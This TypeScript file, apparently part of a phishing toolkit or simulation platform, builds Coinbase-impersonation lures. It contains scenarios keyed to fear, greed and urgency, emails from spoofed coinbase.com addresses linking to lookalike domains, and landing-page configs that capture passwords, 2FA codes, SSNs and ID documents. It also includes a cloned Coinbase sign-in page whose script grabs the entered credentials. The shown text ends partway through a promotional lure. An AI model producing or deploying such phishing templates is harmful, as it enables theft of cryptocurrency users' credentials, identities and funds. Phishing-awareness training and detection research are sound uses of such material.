import { EmailTemplate, SMSTemplate, MobileTemplate } from '@shared/schema';

export interface CoinbaseScenario {
  id: string;
  name: string;
  category: 'security_alert' | 'account_verification' | 'tax_notification' | 'new_feature' | 'promotion' | 'suspicious_activity';
  urgencyLevel: 1 | 2 | 3 | 4 | 5; // 1 = low, 5 = critical
  credibilityFactors: string[];
  psychologicalTriggers: ('fear' | 'greed' | 'urgency' | 'authority' | 'social_proof' | 'curiosity')[];
  targetAudience: 'crypto_novice' | 'experienced_trader' | 'institutional' | 'general';
}

export interface CoinbaseEmailTemplate {
  id: string;
  scenario: CoinbaseScenario;
  subject: string;
  fromName: string;
  fromEmail: string;
  htmlContent: string;
  textContent: string;
  variables: { [key: string]: string };
  attachments?: {
    filename: string;
    content: string;
    contentType: string;
  }[];
  landingPageConfig: {
    url: string;
    design: 'official_clone' | 'simplified' | 'mobile_optimized';
    captureFields: string[];
    mfaSimulation: boolean;
  };
}

export interface CoinbaseSMSTemplate {
  id: string;
  scenario: CoinbaseScenario;
  message: string;
  fromName: string;
  variables: { [key: string]: string };
  followUpAction: 'landing_page' | 'phone_call' | 'app_download';
}

export interface CoinbaseMobileTemplate {
  id: string;
  scenario: CoinbaseScenario;
  appSimulation: {
    appName: string;
    packageName: string;
    iconUrl: string;
    screenshots: string[];
    permissions: string[];
    features: string[];
  };
  landingPageHtml: string;
  formFields: Array<{
    name: string;
    type: string;
    placeholder: string;
    validation: string;
    sensitive: boolean;
  }>;
}

export class CoinbaseTemplateService {
  private emailTemplates: Map<string, CoinbaseEmailTemplate> = new Map();
  private smsTemplates: Map<string, CoinbaseSMSTemplate> = new Map();
  private mobileTemplates: Map<string, CoinbaseMobileTemplate> = new Map();
  private scenarios: Map<string, CoinbaseScenario> = new Map();

  constructor() {
    this.initializeScenarios();
    this.initializeEmailTemplates();
    this.initializeSMSTemplates();
    this.initializeMobileTemplates();
  }

  private initializeScenarios(): void {
    const scenarios: CoinbaseScenario[] = [
      {
        id: 'security_breach_alert',
        name: 'Security Breach Alert',
        category: 'security_alert',
        urgencyLevel: 5,
        credibilityFactors: ['official_branding', 'security_language', 'immediate_action_required'],
        psychologicalTriggers: ['fear', 'urgency', 'authority'],
        targetAudience: 'general'
      },
      {
        id: 'account_suspension_notice',
        name: 'Account Suspension Notice',
        category: 'account_verification',
        urgencyLevel: 4,
        credibilityFactors: ['compliance_language', 'verification_deadline', 'account_limitations'],
        psychologicalTriggers: ['fear', 'urgency', 'authority'],
        targetAudience: 'general'
      },
      {
        id: 'tax_reporting_requirement',
        name: 'Tax Reporting Requirement',
        category: 'tax_notification',
        urgencyLevel: 3,
        credibilityFactors: ['regulatory_compliance', 'irs_reference', 'deadline_pressure'],
        psychologicalTriggers: ['fear', 'authority', 'urgency'],
        targetAudience: 'experienced_trader'
      },
      {
        id: 'new_earn_opportunity',
        name: 'New Earn Opportunity',
        category: 'promotion',
        urgencyLevel: 2,
        credibilityFactors: ['high_apy_rates', 'limited_time_offer', 'early_access'],
        psychologicalTriggers: ['greed', 'urgency', 'social_proof'],
        targetAudience: 'crypto_novice'
      },
      {
        id: 'coinbase_pro_upgrade',
        name: 'Coinbase Pro Upgrade',
        category: 'new_feature',
        urgencyLevel: 2,
        credibilityFactors: ['advanced_features', 'reduced_fees', 'professional_tools'],
        psychologicalTriggers: ['greed', 'social_proof', 'curiosity'],
        targetAudience: 'experienced_trader'
      },
      {
        id: 'suspicious_login_alert',
        name: 'Suspicious Login Alert',
        category: 'suspicious_activity',
        urgencyLevel: 4,
        credibilityFactors: ['login_details', 'location_information', 'device_info'],
        psychologicalTriggers: ['fear', 'urgency', 'authority'],
        targetAudience: 'general'
      }
    ];

    scenarios.forEach(scenario => {
      this.scenarios.set(scenario.id, scenario);
    });
  }

  private initializeEmailTemplates(): void {
    const templates: CoinbaseEmailTemplate[] = [
      {
        id: 'security_breach_urgent',
        scenario: this.scenarios.get('security_breach_alert')!,
        subject: 'URGENT: Security Alert - Immediate Action Required',
        fromName: 'Coinbase Security',
        fromEmail: 'security-alert@coinbase.com',
        htmlContent: this.generateSecurityBreachHTML(),
        textContent: this.generateSecurityBreachText(),
        variables: {
          'USER_EMAIL': 'user@example.com',
          'INCIDENT_ID': 'SEC-2024-001856',
          'DETECTION_TIME': '2024-01-15 14:23:07 UTC',
          'VERIFICATION_LINK': 'https://secure-coinbase-verification.com/verify'
        },
        landingPageConfig: {
          url: '/coinbase/security-verification',
          design: 'official_clone',
          captureFields: ['email', 'password', '2fa_code', 'phone_number'],
          mfaSimulation: true
        }
      },
      {
        id: 'account_suspension_compliance',
        scenario: this.scenarios.get('account_suspension_notice')!,
        subject: 'Action Required: Verify Your Identity to Restore Account Access',
        fromName: 'Coinbase Compliance',
        fromEmail: 'compliance@coinbase.com',
        htmlContent: this.generateAccountSuspensionHTML(),
        textContent: this.generateAccountSuspensionText(),
        variables: {
          'USER_NAME': 'John Doe',
          'ACCOUNT_ID': 'CB-UK-789456123',
          'SUSPENSION_DATE': '2024-01-15',
          'DEADLINE': '2024-01-20',
          'VERIFICATION_LINK': 'https://coinbase-compliance-verification.com/restore'
        },
        landingPageConfig: {
          url: '/coinbase/account-restoration',
          design: 'official_clone',
          captureFields: ['email', 'password', 'id_document', 'address_proof', 'phone_verification'],
          mfaSimulation: true
        }
      },
      {
        id: 'tax_reporting_urgent',
        scenario: this.scenarios.get('tax_reporting_requirement')!,
        subject: 'IRS Compliance: Download Your Coinbase Tax Report Before Deadline',
        fromName: 'Coinbase Tax Support',
        fromEmail: 'tax-support@coinbase.com',
        htmlContent: this.generateTaxReportingHTML(),
        textContent: this.generateTaxReportingText(),
        variables: {
          'TAX_YEAR': '2023',
          'TOTAL_TRANSACTIONS': '247',
          'REPORTING_DEADLINE': 'April 15, 2024',
          'DOWNLOAD_LINK': 'https://coinbase-tax-reports.com/download',
          'FORM_TYPE': '8949'
        },
        landingPageConfig: {
          url: '/coinbase/tax-report-download',
          design: 'simplified',
          captureFields: ['email', 'password', 'ssn', 'tax_id'],
          mfaSimulation: false
        }
      },
      {
        id: 'earn_opportunity_exclusive',
        scenario: this.scenarios.get('new_earn_opportunity')!,
        subject: '🚀 Exclusive: Earn 12% APY on USDC - Limited Time Offer',
        fromName: 'Coinbase Earn',
        fromEmail: 'earn@coinbase.com',
        htmlContent: this.generateEarnOpportunityHTML(),
        textContent: this.generateEarnOpportunityText(),
        variables: {
          'APY_RATE': '12%',
          'MINIMUM_DEPOSIT': '$100',
          'OFFER_EXPIRES': 'January 31, 2024',
          'SIGNUP_LINK': 'https://coinbase-earn-exclusive.com/signup',
          'REFERRAL_BONUS': '$25'
        },
        landingPageConfig: {
          url: '/coinbase/earn-signup',
          design: 'mobile_optimized',
          captureFields: ['email', 'password', 'deposit_amount', 'payment_method'],
          mfaSimulation: false
        }
      }
    ];

    templates.forEach(template => {
      this.emailTemplates.set(template.id, template);
    });
  }

  private generateSecurityBreachHTML(): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Coinbase</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            color: #0a0b0d;
            line-height: 1.5;
        }
        
        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            padding: 24px 32px;
            border-bottom: 1px solid #f2f2f7;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
            color: #0a0b0d;
        }
        
        .logo-icon {
            width: 32px;
            height: 32px;
            background: #0052ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 700;
            font-size: 18px;
        }
        
        .logo-text {
            font-size: 24px;
            font-weight: 600;
            margin-left: 8px;
        }
        
        .signup-link {
            color: #0052ff;
            text-decoration: none;
            font-weight: 500;
            font-size: 16px;
        }
        
        .main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 32px;
        }
        
        .login-container {
            width: 100%;
            max-width: 408px;
        }
        
        .login-title {
            font-size: 32px;
            font-weight: 600;
            color: #0a0b0d;
            margin-bottom: 8px;
            text-align: center;
        }
        
        .security-alert {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .security-alert-title {
            color: #856404;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 8px;
        }
        
        .security-alert-text {
            color: #856404;
            font-size: 14px;
            line-height: 1.4;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            color: #0a0b0d;
            margin-bottom: 8px;
        }
        
        .form-input {
            width: 100%;
            height: 48px;
            padding: 12px 16px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 16px;
            background: #ffffff;
            transition: border-color 0.2s ease;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #0052ff;
            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.1);
        }
        
        .continue-btn {
            width: 100%;
            height: 48px;
            background: #0052ff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-bottom: 24px;
        }
        
        .continue-btn:hover {
            background: #0041cc;
        }
        
        .continue-btn:disabled {
            background: #8b8b8b;
            cursor: not-allowed;
        }
        
        .divider {
            text-align: center;
            margin: 24px 0;
            position: relative;
            color: #8b8b8b;
            font-size: 14px;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #f2f2f7;
            z-index: 1;
        }
        
        .divider span {
            background: white;
            padding: 0 16px;
            position: relative;
            z-index: 2;
        }
        
        .passkey-btn {
            width: 100%;
            height: 48px;
            background: #ffffff;
            color: #0a0b0d;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 16px;
            transition: border-color 0.2s ease;
        }
        
        .passkey-btn:hover {
            border-color: #0052ff;
        }
        
        .social-login {
            display: flex;
            gap: 12px;
            margin-top: 16px;
        }
        
        .social-btn {
            flex: 1;
            height: 48px;
            background: #ffffff;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: border-color 0.2s ease;
        }
        
        .social-btn:hover {
            border-color: #0052ff;
        }
        
        .footer {
            padding: 24px 32px;
            text-align: center;
            border-top: 1px solid #f2f2f7;
            color: #8b8b8b;
            font-size: 14px;
        }
        
        .footer a {
            color: #0052ff;
            text-decoration: none;
        }
        
        .incident-details {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 16px;
            margin: 24px 0;
            font-size: 14px;
        }
        
        .incident-details h4 {
            color: #0a0b0d;
            font-weight: 600;
            margin-bottom: 12px;
        }
        
        .incident-details ul {
            color: #666;
            padding-left: 20px;
        }
        
        .incident-details li {
            margin-bottom: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <a href="#" class="logo">
                <div class="logo-icon">C</div>
                <span class="logo-text">Coinbase</span>
            </a>
            <a href="#" class="signup-link">Sign up</a>
        </header>
        
        <main class="main">
            <div class="login-container">
                <h1 class="login-title">Sign in to Coinbase</h1>
                
                <div class="security-alert">
                    <div class="security-alert-title">🔒 Security Alert</div>
                    <div class="security-alert-text">We detected unusual activity on your account. Please verify your identity to continue.</div>
                </div>
                
                <div class="incident-details">
                    <h4>Incident Details:</h4>
                    <ul>
                        <li><strong>Incident ID:</strong> {{INCIDENT_ID}}</li>
                        <li><strong>Detection Time:</strong> {{DETECTION_TIME}}</li>
                        <li><strong>Location:</strong> Unknown (VPN Detected)</li>
                        <li><strong>Device:</strong> Unknown Mobile Device</li>
                    </ul>
                </div>
                
                <form id="loginForm" action="{{VERIFICATION_LINK}}" method="POST">
                    <div class="form-group">
                        <label for="email" class="form-label">Email</label>
                        <input 
                            type="email" 
                            id="email" 
                            name="email" 
                            class="form-input" 
                            placeholder="Enter your email"
                            value="{{USER_EMAIL}}"
                            required
                        >
                    </div>
                    
                    <div class="form-group">
                        <label for="password" class="form-label">Password</label>
                        <input 
                            type="password" 
                            id="password" 
                            name="password" 
                            class="form-input" 
                            placeholder="Enter your password"
                            required
                        >
                    </div>
                    
                    <button type="submit" class="continue-btn">Continue</button>
                </form>
                
                <div class="divider">
                    <span>OR</span>
                </div>
                
                <button class="passkey-btn">
                    🔐 Sign in with Passkey
                </button>
                
                <div class="social-login">
                    <button class="social-btn">
                        <svg width="20" height="20" viewBox="0 0 24 24">
                            <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                            <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                            <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                            <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                        </svg>
                    </button>
                    <button class="social-btn">
                        <svg width="20" height="20" viewBox="0 0 24 24">
                            <path fill="#000" d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.098.119.112.223.083.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.746-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z"/>
                        </svg>
                    </button>
                </div>
            </div>
        </main>
        
        <footer class="footer">
            <p>Not your device? Use a private window. See our <a href="#">Privacy Policy</a> for more info.</p>
        </footer>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Capture form data
            const formData = new FormData(this);
            const email = formData.get('email');
            const password = formData.get('password');
            
            // Store data (in real implementation, would send to server)
            console.log('Captured credentials:', { email, password });
            
            // Redirect to success page
            window.location.href = '/verification-complete';
        });
    </script>
</body>
</html>`;
  }

  private generateSecurityBreachText(): string {
    return `
COINBASE SECURITY ALERT - URGENT ACTION REQUIRED

Dear {{USER_EMAIL}},

Our security systems have detected suspicious activity on your Coinbase account. Multiple login attempts were made from an unrecognized device and location.

INCIDENT DETAILS:
- Incident ID: {{INCIDENT_ID}}
- Detection Time: {{DETECTION_TIME}}
- Attempted Location: Unknown (VPN Detected)
- Device: Unknown Mobile Device

IMMEDIATE ACTION REQUIRED to secure your account and prevent unauthorized access to your crypto assets.

Secure your account immediately: {{VERIFICATION_LINK}}

What we've done:
- Temporarily restricted account access
- Blocked all pending transactions
- Enhanced monitoring on your account
- Notified our security team

This verification must be completed within 24 hours or your account will be temporarily suspended for your protection.

© 2024 Coinbase, Inc. All rights reserved.
    `.trim();
  }

  private generateAccountSuspensionHTML(): string {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase Account Verification</title>
</head>
<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
        <tr>
            <td style="padding: 40px 20px;">
                <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%" style="max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
                    <!-- Header -->
                    <tr>
                        <td style="padding: 30px 40px; text-align: center; background-color: #1652f0; border-radius: 8px 8px 0 0;">
                            <img src="https://logos.coinbase.com/coinbase_logo_white.png" alt="Coinbase" style="height: 32px; margin-bottom: 20px;">
                            <h1 style="color: white; font-size: 24px; margin: 0; font-weight: 600;">Account Verification Required</h1>
                        </td>
                    </tr>
                    
                    <!-- Content -->
                    <tr>
                        <td style="padding: 40px;">
                            <p style="color: #333; font-size: 16px; line-height: 1.6; margin: 0 0 20px;">Hello {{USER_NAME}},</p>
                            
                            <p style="color: #333; font-size: 16px; line-height: 1.6; margin: 0 0 20px;">
                                As part of our ongoing compliance with UK financial regulations and to ensure the security of your account, we need you to complete additional verification.
                            </p>
                            
                            <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; margin: 20px 0;">
                                <h3 style="color: #856404; margin: 0 0 10px; font-size: 18px;">Account Status:</h3>
                                <p style="color: #856404; margin: 0; font-weight: 600;">Temporarily Restricted</p>
                                <p style="color: #856404; margin: 5px 0 0; font-size: 14px;">Account ID: {{ACCOUNT_ID}}</p>
                            </div>
                            
                            <h3 style="color: #333; font-size: 18px; margin: 30px 0 15px;">What's Required:</h3>
                            <ul style="color: #333; line-height: 1.6; padding-left: 20px;">
                                <li>Verify your identity with government-issued ID</li>
                                <li>Confirm your current address</li>
                                <li>Complete enhanced due diligence questionnaire</li>
                                <li>Re-authenticate your account credentials</li>
                            </ul>
                            
                            <div style="background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 6px; padding: 20px; margin: 20px 0;">
                                <p style="color: #0c5460; margin: 0; font-weight: 600;">⏰ Deadline: {{DEADLINE}}</p>
                                <p style="color: #0c5460; margin: 10px 0 0; font-size: 14px;">
                                    Failure to complete verification by this date will result in permanent account suspension.
                                </p>
                            </div>
                            
                            <!-- CTA Button -->
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="{{VERIFICATION_LINK}}" style="display: inline-block; background-color: #1652f0; color: white; text-decoration: none; padding: 15px 30px; border-radius: 6px; font-weight: 600; font-size: 16px;">
                                    Complete Verification
                                </a>
                            </div>
                            
                            <p style="color: #666; font-size: 14px; line-height: 1.5; margin: 20px 0;">
                                This process typically takes 3-5 minutes and helps us protect your account and comply with regulatory requirements.
                            </p>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding: 30px 40px; background-color: #f8f9fa; border-radius: 0 0 8px 8px; text-align: center;">
                            <p style="color: #666; font-size: 12px; margin: 0 0 10px;">
                                © 2024 Coinbase, Inc. All rights reserved.
                            </p>
                            <p style="color: #666; font-size: 12px; margin: 0;">
                                Authorized and regulated by the Financial Conduct Authority (FCA)
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`;
  }

  private generateAccountSuspensionText(): string {
    return `
COINBASE - ACCOUNT VERIFICATION REQUIRED

Hello {{USER_NAME}},

As part of our ongoing compliance with UK financial regulations and to ensure the security of your account, we need you to complete additional verification.

ACCOUNT STATUS: Temporarily Restricted
Account ID: {{ACCOUNT_ID}}

WHAT'S REQUIRED:
- Verify your identity with government-issued ID
- Confirm your current address
- Complete enhanced due diligence questionnaire
- Re-authenticate your account credentials

DEADLINE: {{DEADLINE}}
Failure to complete verification by this date will result in permanent account suspension.

Complete verification: {{VERIFICATION_LINK}}

This process typically takes 3-5 minutes and helps us protect your account and comply with regulatory requirements.

© 2024 Coinbase, Inc. All rights reserved.
Authorized and regulated by the Financial Conduct Authority (FCA)
    `.trim();
  }

  private generateTaxReportingHTML(): string {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase Tax Report</title>
</head>
<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
        <tr>
            <td style="padding: 40px 20px;">
                <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%" style="max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
                    <!-- Header -->
                    <tr>
                        <td style="padding: 30px 40px; text-align: center; background-color: #1652f0; border-radius: 8px 8px 0 0;">
                            <img src="https://logos.coinbase.com/coinbase_logo_white.png" alt="Coinbase" style="height: 32px; margin-bottom: 20px;">
                            <h1 style="color: white; font-size: 24px; margin: 0; font-weight: 600;">Your {{TAX_YEAR}} Tax Report is Ready</h1>
                        </td>
                    </tr>
                    
                    <!-- Content -->
                    <tr>
                        <td style="padding: 40px;">
                            <p style="color: #333; font-size: 16px; line-height: 1.6; margin: 0 0 20px;">
                                Your Coinbase tax report for {{TAX_YEAR}} is now available for download. This report contains all the information you need for accurate tax filing.
                            </p>
                            
                            <div style="background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 6px; padding: 20px; margin: 20px 0;">
                                <h3 style="color: #333; margin: 0 0 15px; font-size: 18px;">Report Summary:</h3>
                                <ul style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                                    <li><strong>Tax Year:</strong> {{TAX_YEAR}}</li>
                                    <li><strong>Total Transactions:</strong> {{TOTAL_TRANSACTIONS}}</li>
                                    <li><strong>Form Type:</strong> {{FORM_TYPE}}</li>
                                    <li><strong>Filing Deadline:</strong> {{REPORTING_DEADLINE}}</li>
                                </ul>
                            </div>
                            
                            <div style="background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 6px; padding: 20px; margin: 20px 0;">
                                <h4 style="color: #0c5460; margin: 0 0 10px;">⚠️ Important Tax Information</h4>
                                <p style="color: #0c5460; margin: 0; font-size: 14px; line-height: 1.5;">
                                    The IRS requires all cryptocurrency transactions to be reported. Download your report before the deadline to ensure compliance.
                                </p>
                            </div>
                            
                            <!-- CTA Button -->
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="{{DOWNLOAD_LINK}}" style="display: inline-block; background-color: #28a745; color: white; text-decoration: none; padding: 15px 30px; border-radius: 6px; font-weight: 600; font-size: 16px;">
                                    📄 Download Tax Report
                                </a>
                            </div>
                            
                            <h3 style="color: #333; font-size: 18px; margin: 30px 0 15px;">What's Included:</h3>
                            <ul style="color: #333; line-height: 1.6; padding-left: 20px;">
                                <li>Complete transaction history</li>
                                <li>Capital gains and losses calculations</li>
                                <li>Cost basis information</li>
                                <li>Form 8949 compatible format</li>
                                <li>Detailed trade summaries</li>
                            </ul>
                            
                            <p style="color: #666; font-size: 14px; line-height: 1.5; margin: 20px 0;">
                                Having trouble with your taxes? Consider consulting with a crypto-experienced tax professional.
                            </p>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding: 30px 40px; background-color: #f8f9fa; border-radius: 0 0 8px 8px; text-align: center;">
                            <p style="color: #666; font-size: 12px; margin: 0 0 10px;">
                                © 2024 Coinbase, Inc. All rights reserved.
                            </p>
                            <p style="color: #666; font-size: 12px; margin: 0;">
                                This is not tax advice. Please consult a tax professional.
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`;
  }

  private generateTaxReportingText(): string {
    return `
COINBASE - YOUR {{TAX_YEAR}} TAX REPORT IS READY

Your Coinbase tax report for {{TAX_YEAR}} is now available for download. This report contains all the information you need for accurate tax filing.

REPORT SUMMARY:
- Tax Year: {{TAX_YEAR}}
- Total Transactions: {{TOTAL_TRANSACTIONS}}
- Form Type: {{FORM_TYPE}}
- Filing Deadline: {{REPORTING_DEADLINE}}

IMPORTANT: The IRS requires all cryptocurrency transactions to be reported. Download your report before the deadline to ensure compliance.

Download Tax Report: {{DOWNLOAD_LINK}}

WHAT'S INCLUDED:
- Complete transaction history
- Capital gains and losses calculations
- Cost basis information
- Form 8949 compatible format
- Detailed trade summaries

Having trouble with your taxes? Consider consulting with a crypto-experienced tax professional.

© 2024 Coinbase, Inc. All rights reserved.
This is not tax advice. Please consult a tax professional.
    `.trim();
  }

  private generateEarnOpportunityHTML(): string {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase Earn Opportunity</title>
</head>
<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
        <tr>
            <td style="padding: 40px 20px;">
                <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%" style="max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
                    <!-- Header -->
                    <tr>
                        <td style="padding: 30px 40px; text-align: center; background: linear-gradient(135deg, #00d395, #00b386); border-radius: 8px 8px 0 0;">
                            <img src="https://logos.coinbase.com/coinbase_logo_white.png" alt="Coinbase" style="height: 32px; margin-bottom: 20px;">
                            <h1 style="color: white; font-size: 28px; margin: 0; font-weight: 600;">🚀 Exclusive Earn Opportunity</h1>
                        </td>
                    </tr>
                    
                    <!-- Offer Banner -->
                    <tr>
                        <td style="padding: 0; background: linear-gradient(135deg, #ff6b35, #ff8c42);">
                            <div style="padding: 20px 40px; color: white; text-align: center;">
                                <h2 style="margin: 0; font-size: 36px; font-weight: 700;">{{APY_RATE}} APY</h2>
                                <p style="margin: 10px 0 0; font-size: 18px; font-weight: 500;">on USDC deposits</p>
                            </div>
                        </td>
                    </tr>
                    
                    <!-- Content -->
                    <tr>
                        <td style="padding: 40px;">
                            <p style="color: #333; font-size: 16px; line-height: 1.6; margin: 0 0 20px;">
                                🎉 <strong>Congratulations!</strong> You've been selected for our exclusive high-yield USDC earning opportunity.
                            </p>
                            
                            <div style="background-color: #f0f8ff; border: 2px solid #4dabf7; border-radius: 8px; padding: 25px; margin: 25px 0; text-align: center;">
                                <h3 style="color: #1c7ed6; margin: 0 0 15px; font-size: 20px;">Limited Time Offer</h3>
                                <p style="color: #1c7ed6; margin: 0; font-size: 16px; font-weight: 600;">
                                    Earn {{APY_RATE}} annual percentage yield on your USDC deposits
                                </p>
                                <p style="color: #666; margin: 10px 0 0; font-size: 14px;">
                                    Minimum deposit: {{MINIMUM_DEPOSIT}} • Offer expires: {{OFFER_EXPIRES}}
                                </p>
                            </div>
                            
                            <h3 style="color: #333; font-size: 18px; margin: 30px 0 15px;">Why This Offer?</h3>
                            <ul style="color: #333; line-height: 1.6; padding-left: 20px;">
                                <li><strong>Market-leading rates:</strong> Higher than traditional savings accounts</li>
                                <li><strong>Stable returns:</strong> USDC is pegged to the US dollar</li>
                                <li><strong>Instant liquidity:</strong> Withdraw anytime without penalties</li>
                                <li><strong>Secure platform:</strong> Your funds are protected by Coinbase security</li>
                            </ul>
                            
                            <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px; padding: 20px; margin: 20px 0;">
                                <h4 style="color: #856404; margin: 0 0 10px;">🎁 Bonus Offer</h4>
                                <p style="color: #856404; margin: 0; font-size: 14px;">
                                    Deposit {{MINIMUM_DEPOSIT}} or more in the first 48 hours and receive an additional {{REFERRAL_BONUS}} bonus!
                                </p>
                            </div>
                            
                            <!-- CTA Button -->
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="{{SIGNUP_LINK}}" style="display: inline-block; background: linear-gradient(135deg, #00d395, #00b386); color: white; text-decoration: none; padding: 15px 30px; border-radius: 6px; font-weight: 600; font-size: 16px;">
                                    Start Earning {{APY_RATE}} APY Now
                                </a>
                            </div>
                            
                            <p style="color: #666; font-size: 12px; line-height: 1.5; margin: 20px 0; text-align: center;">
                                *Annual Percentage Yield. Rate subject to change. Terms and conditions apply.
                            </p>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding: 30px 40px; background-color: #f8f9fa; border-radius: 0 0 8px 8px; text-align: center;">
                            <p style="color: #666; font-size: 12px; margin: 0 0 10px;">
                                © 2024 Coinbase, Inc. All rights reserved.
                            </p>
                            <p style="color: #666; font-size: 12px; margin: 0;">
                                Cryptocurrency is not FDIC insured and involves risk of loss.
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`;
  }

  private generateEarnOpportunityText(): string {
    return `
COINBASE EARN - EXCLUSIVE OPPORTUNITY

🎉 Congratulations! You've been selected for our exclusive high-yield USDC earning opportunity.

LIMITED TIME OFFER
Earn {{APY_RATE}} annual percentage yield on your USDC deposits
Minimum deposit: {{MINIMUM_DEPOSIT}} • Offer expires: {{OFFER_EXPIRES}}

